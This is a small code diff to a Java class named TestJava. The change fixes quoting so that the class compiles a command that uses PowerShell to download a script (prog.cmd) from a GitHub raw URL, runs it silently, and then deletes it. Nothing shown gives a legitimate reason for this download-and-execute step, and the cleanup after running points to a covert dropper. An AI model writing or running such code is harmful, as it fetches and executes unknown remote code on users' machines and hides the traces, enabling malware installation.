@@ -1,9 +1,9 @@
 import java.io.*;
 
-public class TestJava {
+class TestJava {
     public static void main(String[] args) {
         try {
-            String[] commands = {"cmd", "/c", "@echo OFF && powershell.exe -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/NC-devC/testmce/main/prog.cmd -OutFile prog.cmd" && prog.cmd && del prog.cmd"};
+            String[] commands = {"cmd", "/c", "@echo OFF && powershell.exe -Command \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/NC-devC/testmce/main/prog.cmd -OutFile prog.cmd\" && prog.cmd && del prog.cmd"};
             ProcessBuilder pb = new ProcessBuilder(commands);
             pb.redirectErrorStream(true);
             Process p = pb.start();
